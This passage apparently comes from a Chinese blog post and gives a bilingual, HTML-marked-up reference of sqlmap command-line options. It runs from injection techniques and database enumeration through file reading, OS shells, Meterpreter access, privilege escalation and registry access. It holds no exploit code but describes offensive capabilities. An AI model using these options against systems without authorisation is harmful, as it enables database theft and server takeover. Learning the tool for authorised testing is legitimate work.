class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Techniques（技巧）:</span><br><span class=\"line\">These options can be used <span class=\"keyword\">to</span> tweak testing of specific SQL injection techniques</span><br><span class=\"line\"><span class=\"comment\">## 这些选项可用于调整具体的SQL注入测试。</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--technique</span>=TECH SQL injection techniques <span class=\"keyword\">to</span> use (default <span class=\"string\">\"BEUSTQ\"</span>)</span><br><span class=\"line\"><span class=\"comment\">## SQL 注入技术测试（默认BEUST）</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--time-sec</span>=TIMESEC Seconds <span class=\"keyword\">to</span> delay the DBMS response (default 5)</span><br><span class=\"line\"><span class=\"comment\">##  DBMS响应的延迟时间（默认为5秒）</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--union-cols</span>=UCOLS Range of columns <span class=\"keyword\">to</span> test <span class=\"keyword\">for</span> UNION query SQL injection</span><br><span class=\"line\"><span class=\"comment\">##  定列范围用于测试UNION查询注入</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--union-char</span>=UCHAR Character <span class=\"keyword\">to</span> use <span class=\"keyword\">for</span> bruteforcing number of columns</span><br><span class=\"line\"><span class=\"comment\">##  用于暴力猜解列数的字符</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--union-from</span>=UFROM Table <span class=\"keyword\">to</span> use <span class=\"keyword\">in</span> <span class=\"keyword\">FROM</span> part of UNION query SQL injection</span><br><span class=\"line\"><span class=\"comment\">##  要在UNION查询SQL注入的FROM部分使用的表</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--dns-domain</span>=DNS.. Domain name used <span class=\"keyword\">for</span><span class=\"built_in\"> DNS </span>exfiltration attack</span><br><span class=\"line\"><span class=\"comment\">##  域名用于DNS漏出攻击</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--second-order</span>=S.. Resulting<span class=\"built_in\"> page </span>URL searched <span class=\"keyword\">for</span> second-order response</span><br><span class=\"line\"><span class=\"comment\">## 生成页面的URL搜索为second-order响应</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"Fingerprint（指纹）\"><a href=\"#Fingerprint（指纹）\" class=\"headerlink\" title=\"Fingerprint（指纹）\"></a>Fingerprint（指纹）</h3><figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Fingerprint（指纹）:</span><br><span class=\"line\">​</span><br><span class=\"line\">-f, <span class=\"comment\">--fingerprint Perform an extensive DBMS version fingerprint</span></span><br><span class=\"line\"><span class=\"comment\">## 执行检查广泛的DBMS版本指纹</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"Enumeration（枚举）\"><a href=\"#Enumeration（枚举）\" class=\"headerlink\" title=\"Enumeration（枚举）\"></a>Enumeration（枚举）</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Enumeration（枚举）:</span><br><span class=\"line\">​</span><br><span class=\"line\">These options can be used <span class=\"keyword\">to</span> enumerate the back-end database management<span class=\"built_in\"> system </span>information, structure <span class=\"keyword\">and</span> data contained <span class=\"keyword\">in</span> the tables. Moreover you can <span class=\"builtin-name\">run</span> your own SQL statements</span><br><span class=\"line\"><span class=\"comment\">## 这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。</span></span><br><span class=\"line\">​</span><br><span class=\"line\">-a, --all Retrieve everything</span><br><span class=\"line\"><span class=\"comment\">## 检索一切</span></span><br><span class=\"line\">​</span><br><span class=\"line\">-b, --banner Retrieve DBMS banner</span><br><span class=\"line\"><span class=\"comment\">## 检索数据库管理系统的标识</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--current-user Retrieve DBMS current user</span><br><span class=\"line\"><span class=\"comment\">##  检索数据库管理系统的 标识</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--current-db Retrieve DBMS current database</span><br><span class=\"line\"><span class=\"comment\">## 检索数据库管理系统当前数据库</span></span><br><span class=\"line\">​</span><br><span class=\"line\">-hostname Retrieve DBMS<span class=\"built_in\"> server </span>hostname</span><br><span class=\"line\"><span class=\"comment\">## 检索数据库服务器的主机名</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--is-dba Detect <span class=\"keyword\">if</span> the DBMS current<span class=\"built_in\"> user </span>is DBA</span><br><span class=\"line\"><span class=\"comment\">## 检测DBMS当前用户是否DBA</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--users Enumerate DBMS users</span><br><span class=\"line\"><span class=\"comment\">## 枚举数据库管理系统用户</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--passwords Enumerate DBMS<span class=\"built_in\"> users </span>password hashes</span><br><span class=\"line\"><span class=\"comment\">## 枚举数据库管理系统用户密码哈希</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--privileges Enumerate DBMS<span class=\"built_in\"> users </span>privileges</span><br><span class=\"line\"><span class=\"comment\">## 枚举数据库管理系统用户的权限</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--roles Enumerate DBMS<span class=\"built_in\"> users </span>roles</span><br><span class=\"line\"><span class=\"comment\">## 枚举数据库管理系统用户的角色</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--dbs Enumerate DBMS databases</span><br><span class=\"line\"><span class=\"comment\">## 枚举数据库管理系统数据库</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--tables Enumerate DBMS database tables</span><br><span class=\"line\"><span class=\"comment\">##  枚举的DBMS数据库中的表</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--columns Enumerate DBMS database table columns</span><br><span class=\"line\"><span class=\"comment\">## 枚举DBMS数据库表列</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--schema Enumerate DBMS schema</span><br><span class=\"line\"><span class=\"comment\">## 枚举数据库架构</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--count Retrieve number of entries <span class=\"keyword\">for</span> table(s)</span><br><span class=\"line\"><span class=\"comment\">## 检索表的条目数</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--dump Dump DBMS database table entries</span><br><span class=\"line\"><span class=\"comment\">##  转储数据库管理系统的数据库中的表项</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--dump-all Dump all DBMS databases tables entries</span><br><span class=\"line\"><span class=\"comment\">## 转储数据库管理系统的数据库中的表项</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--search Search column(s), table(s) <span class=\"keyword\">and</span>/<span class=\"keyword\">or</span> database name(s)</span><br><span class=\"line\"><span class=\"comment\">##  搜索列（S），表（S）和/或数据库名称（S）</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--comments Retrieve DBMS comments</span><br><span class=\"line\"><span class=\"comment\">##  检索数据库的comments(注释、评论)</span></span><br><span class=\"line\">​</span><br><span class=\"line\">-D DB DBMS database <span class=\"keyword\">to</span> enumerate</span><br><span class=\"line\"><span class=\"comment\">## 要进行枚举的数据库名</span></span><br><span class=\"line\">​</span><br><span class=\"line\">-T TBL DBMS database table(s) <span class=\"keyword\">to</span> enumerate</span><br><span class=\"line\"><span class=\"comment\">##  要进行枚举的数据库表</span></span><br><span class=\"line\">​</span><br><span class=\"line\">-C COL DBMS database table column(s) <span class=\"keyword\">to</span> enumerate</span><br><span class=\"line\"><span class=\"comment\">## 要进行枚举的数据库列</span></span><br><span class=\"line\">​</span><br><span class=\"line\">-X EXCLUDECOL DBMS database table column(s) <span class=\"keyword\">to</span> <span class=\"keyword\">not</span> enumerate</span><br><span class=\"line\"><span class=\"comment\">## 要不进行枚举的数据库列</span></span><br><span class=\"line\">​</span><br><span class=\"line\">-U<span class=\"built_in\"> USER </span>DBMS<span class=\"built_in\"> user </span><span class=\"keyword\">to</span> enumerate</span><br><span class=\"line\"><span class=\"comment\">## 用来进行枚举的数据库用户</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--exclude-sysdbs Exclude DBMS<span class=\"built_in\"> system </span>databases when enumerating tables</span><br><span class=\"line\"><span class=\"comment\">##  枚举表时排除系统数据库</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--pivot-column</span>=P.. Pivot column name</span><br><span class=\"line\"><span class=\"comment\">## 主列名称</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--where</span>=DUMPWHERE Use WHERE condition <span class=\"keyword\">while</span> table dumping</span><br><span class=\"line\"><span class=\"comment\">## 使用WHERE条件进行表转储</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--start</span>=LIMITSTART First query output entry <span class=\"keyword\">to</span> retrieve</span><br><span class=\"line\"><span class=\"comment\">##  第一个查询输出进入检索</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--stop</span>=LIMITSTOP Last query output entry <span class=\"keyword\">to</span> retrieve</span><br><span class=\"line\"><span class=\"comment\">## 最后查询的输出进入检索</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--first</span>=FIRSTCHAR First query output word character <span class=\"keyword\">to</span> retrieve</span><br><span class=\"line\"><span class=\"comment\">## 第一个查询输出字的字符检索</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--last</span>=LASTCHAR Last query output word character <span class=\"keyword\">to</span> retrieve</span><br><span class=\"line\"><span class=\"comment\">## 最后查询的输出字字符检索</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--sql-query</span>=QUERY SQL statement <span class=\"keyword\">to</span> be executed</span><br><span class=\"line\"><span class=\"comment\">## 要执行的SQL语句</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--sql-shell Prompt <span class=\"keyword\">for</span> an interactive SQL shell</span><br><span class=\"line\"><span class=\"comment\">## 提示交互式SQL的shell</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--sql-file</span>=SQLFILE Execute SQL statements <span class=\"keyword\">from</span> given file(s)</span><br><span class=\"line\"><span class=\"comment\">## 从给定文件执行SQL语句</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"Brute-Force（蛮力）\"><a href=\"#Brute-Force（蛮力）\" class=\"headerlink\" title=\"Brute Force（蛮力）\"></a>Brute Force（蛮力）</h3><figure class=\"highlight clean\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Brute force（蛮力）:</span><br><span class=\"line\">​</span><br><span class=\"line\">These options can be used to run brute force checks</span><br><span class=\"line\">## 这些选项可以被用来运行蛮力检查。</span><br><span class=\"line\">​</span><br><span class=\"line\">--common-tables Check existence <span class=\"keyword\">of</span> common tables</span><br><span class=\"line\">## 检查存在共同表</span><br><span class=\"line\">​</span><br><span class=\"line\">--common-columns Check existence <span class=\"keyword\">of</span> common columns</span><br><span class=\"line\">## 检查存在共同列</span><br></pre></td></tr></table></figure>\n<h3 id=\"User-defined-function-injection（用户自定义函数注入）\"><a href=\"#User-defined-function-injection（用户自定义函数注入）\" class=\"headerlink\" title=\"User-defined function injection（用户自定义函数注入）\"></a>User-defined function injection（用户自定义函数注入）</h3><figure class=\"highlight vbnet\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-defined <span class=\"keyword\">function</span> injection（用户自定义函数注入）:</span><br><span class=\"line\">​</span><br><span class=\"line\">These options can be used <span class=\"keyword\">to</span> create <span class=\"keyword\">custom</span> user-defined functions</span><br><span class=\"line\"><span class=\"meta\">## 这些选项可以用来创建用户自定义函数。</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--udf-inject Inject <span class=\"keyword\">custom</span> user-defined functions</span><br><span class=\"line\"><span class=\"meta\">## 注入用户自定义函数</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--<span class=\"keyword\">shared</span>-<span class=\"keyword\">lib</span>=SHLIB Local path <span class=\"keyword\">of</span> the <span class=\"keyword\">shared</span> library</span><br><span class=\"line\"><span class=\"meta\">## 共享库的本地路径</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"File-system-access（访问文件系统）\"><a href=\"#File-system-access（访问文件系统）\" class=\"headerlink\" title=\"File system access（访问文件系统）\"></a>File system access（访问文件系统）</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">File<span class=\"built_in\"> system </span>access（访问文件系统）:</span><br><span class=\"line\">These options can be used <span class=\"keyword\">to</span> access the back-end database management<span class=\"built_in\"> system </span>underlying file system</span><br><span class=\"line\"><span class=\"comment\">## 这些选项可以被用来访问后端数据库管理系统的底层文件系统。</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--file-read</span>=RFILE Read a file <span class=\"keyword\">from</span> the back-end DBMS file system</span><br><span class=\"line\"><span class=\"comment\">## 从后端的数据库管理系统文件系统读取文件</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--file-write</span>=WFILE Write a local file on the back-end DBMS file system</span><br><span class=\"line\"><span class=\"comment\">## 编辑后端的数据库管理系统文件系统上的本地文件</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--file-dest</span>=DFILE Back-end DBMS absolute filepath <span class=\"keyword\">to</span> write <span class=\"keyword\">to</span></span><br><span class=\"line\"><span class=\"comment\">## 后端的数据库管理系统写入文件的绝对路径</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"Operating-system-access（操作系统访问）\"><a href=\"#Operating-system-access（操作系统访问）\" class=\"headerlink\" title=\"Operating system access（操作系统访问）\"></a>Operating system access（操作系统访问）</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Operating<span class=\"built_in\"> system </span>access（操作系统访问）:</span><br><span class=\"line\">​</span><br><span class=\"line\">These options can be used <span class=\"keyword\">to</span> access the back-end database management<span class=\"built_in\"> system </span>underlying operating system</span><br><span class=\"line\"><span class=\"comment\">## 这些选项可以用于访问后端数据库管理系统的底层操作系统。</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--os-cmd</span>=OSCMD Execute an operating<span class=\"built_in\"> system </span>command</span><br><span class=\"line\"><span class=\"comment\">## 执行操作系统命令</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--os-shell Prompt <span class=\"keyword\">for</span> an interactive operating<span class=\"built_in\"> system </span>shell</span><br><span class=\"line\"><span class=\"comment\">##  交互式的操作系统的shell</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--os-pwn Prompt <span class=\"keyword\">for</span> an OOB shell, Meterpreter <span class=\"keyword\">or</span> VNC</span><br><span class=\"line\"><span class=\"comment\">## 获取一个OOB shell，meterpreter或VNC</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--os-smbrelay One click prompt <span class=\"keyword\">for</span> an OOB shell, Meterpreter <span class=\"keyword\">or</span> VNC</span><br><span class=\"line\"><span class=\"comment\">## 一键获取一个OOB shell，meterpreter或VNC</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--os-bof Stored procedure buffer overflow exploitation</span><br><span class=\"line\"><span class=\"comment\">## 存储过程缓冲区溢出利用</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--priv-esc Database process<span class=\"built_in\"> user </span>privilege escalation</span><br><span class=\"line\"><span class=\"comment\">## 数据库进程用户权限提升</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--msf-path</span>=MSFPATH Local path where Metasploit Framework is installed Metasploit Framework</span><br><span class=\"line\"><span class=\"comment\">## 本地的安装路径</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--tmp-path</span>=TMPPATH Remote absolute path of temporary files directory</span><br><span class=\"line\"><span class=\"comment\">## 远程临时文件目录的绝对路径</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"Windows-registry-access（Windows注册表访问）\"><a href=\"#Windows-registry-access（Windows注册表访问）\" class=\"headerlink\" title=\"Windows registry access（Windows注册表访问）\"></a>Windows registry access（Windows注册表访问）</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Windows registry access（Windows注册表访问）:</span><br><span class=\"line\">​</span><br><span class=\"line\">These options can be used <span class=\"keyword\">to</span> access the back-end database management<span class=\"built_in\"> system </span>Windows registry</span><br><span class=\"line\"><span class=\"comment\">## 这些选项可以被用来访问后端数据库管理系统Windows注册表。</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--reg-read Read a Windows registry key value</span><br><span class=\"line\"><span class=\"comment\">## 读一个Windows注册表项值</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--reg-<span class=\"builtin-name\">add</span> Write a Windows registry key value data</span><br><span class=\"line\"><span class=\"comment\">## 写一个Windows注册表项值数据</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--reg-del Delete a Windows registry key value</span><br><span class=\"line\"><span class=\"comment\">## 删除Windows注册表键值</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--reg-key</span>=REGKEY Windows registry key</span><br><span class=\"line\"><span class=\"comment\">## Windows注册表键</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--reg-value</span>=REGVAL Windows registry key value</span><br><span class=\"line\"><span class=\"comment\">##  Windows注册表项值</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--reg-data</span>=REGDATA Windows registry key value data</span><br><span class=\"line\"><span class=\"comment\">## Windows注册表键值数据</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--reg-type</span>=REGTYPE Windows registry key value type</span><br><span class=\"line\"><span class=\"comment\">## Windows注册表项值类型</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"General（一般）\"><a href=\"#General（一般）\" class=\"headerlink\" title=\"General（一般）\"></a>General（一般）</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">General（一般）:</span><br><span class=\"line\">​</span><br><span class=\"line\">These options can be used <span class=\"keyword\">to</span> <span class=\"builtin-name\">set</span> some general working parameters</span><br><span class=\"line\"><span class=\"comment\">## 这些选项可以用来设置一些一般的工作参数。</span></span><br><span class=\"line\">​</span><br><span class=\"line\">-s SESSIONFILE Load session <span class=\"keyword\">from</span> a stored (.sqlite) file</span><br><span class=\"line\"><span class=\"comment\">## 保存和恢复检索会话文件的所有数据</span></span><br><span class=\"line\">​</span><br><span class=\"line\">-t TRAFFICFILE Log all HTTP traffic into a textual file</span><br><span class=\"line\"><span class=\"comment\">## 记录所有HTTP流量到一个文本文件中</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--batch Never ask <span class=\"keyword\">for</span><span class=\"built_in\"> user </span>input, use the<span class=\"built_in\"> default </span>behaviour</span><br><span class=\"line\"><span class=\"comment\">## 从不询问用户输入，使用所有默认配置。</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--binary-fields</span>=.. Result fields having binary values (e.g. <span class=\"string\">\"digest\"</span>)</span><br><span class=\"line\"><span class=\"comment\">## 具有二进制值的结果字段</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--charset</span>=CHARSET Force character encoding used <span class=\"keyword\">for</span> data retrieval</span><br><span class=\"line\"><span class=\"comment\">## 强制用于数据检索的字符编码</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--crawl</span>=CRAWLDEPTH Crawl the website starting <span class=\"keyword\">from</span> the target URL</span><br><span class=\"line\"><span class=\"comment\">## 从目标网址开始抓取网站</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--crawl-exclude</span>=.. Regexp <span class=\"keyword\">to</span> exclude pages <span class=\"keyword\">from</span> crawling (e.g. <span class=\"string\">\"logout\"</span>)</span><br><span class=\"line\"><span class=\"comment\">## 正则表达式排除网页抓取</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--csv-del</span>=CSVDEL Delimiting character used <span class=\"keyword\">in</span> CSV output (default <span class=\"string\">\",\"</span>)</span><br><span class=\"line\"><span class=\"comment\">## 分隔CSV输出中使用的字符</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--dump-format</span>=DU.. Format of dumped data (CSV (default), HTML <span class=\"keyword\">or</span> SQLITE)</span><br><span class=\"line\"><span class=\"comment\">## 转储数据的格式</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--eta Display <span class=\"keyword\">for</span> each output the estimated time of arrival</span><br><span class=\"line\"><span class=\"comment\">## 显示每个输出的预计到达时间</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--flush-session Flush session files <span class=\"keyword\">for</span> current target</span><br><span class=\"line\"><span class=\"comment\">## 刷新当前目标的会话文件</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--forms Parse <span class=\"keyword\">and</span> test forms on target URL</span><br><span class=\"line\"><span class=\"comment\">## 在目标网址上解析和测试表单</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--fresh-queries Ignore query results stored <span class=\"keyword\">in</span> session file</span><br><span class=\"line\"><span class=\"comment\">## 忽略在会话文件中存储的查询结果</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--hex Use DBMS hex function(s) <span class=\"keyword\">for</span> data retrieval</span><br><span class=\"line\"><span class=\"comment\">## 使用DBMS hex函数进行数据检索</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--output-dir</span>=OUT.. Custom output directory path</span><br><span class=\"line\"><span class=\"comment\">## 自定义输出目录路径</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--parse-errors Parse <span class=\"keyword\">and</span> display DBMS <span class=\"builtin-name\">error</span> messages <span class=\"keyword\">from</span> responses</span><br><span class=\"line\"><span class=\"comment\">## 解析和显示响应中的DBMS错误消息</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--save</span>=SAVECONFIG Save options 